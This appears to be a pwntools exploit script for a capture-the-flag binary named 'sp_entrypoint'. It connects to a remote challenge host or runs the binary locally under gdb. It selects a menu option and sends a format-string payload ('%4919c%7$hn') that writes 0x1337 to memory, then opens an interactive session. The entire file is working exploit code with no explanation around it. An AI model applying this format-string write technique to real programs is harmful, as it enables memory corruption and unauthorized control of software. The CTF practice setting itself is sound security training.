from pwn import *

gs = '''
b *main+137
continue
'''

elf = context.binary = ELF("./sp_entrypoint")

def start():
    if args.REMOTE:
        return remote("94.237.59.63", 54020)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']


io = start()

io.sendlineafter("> ", b"1")

io.sendlineafter(": ", f"%4919c%7$hn".encode())

io.recvuntil("Your card is: ")

io.interactive()
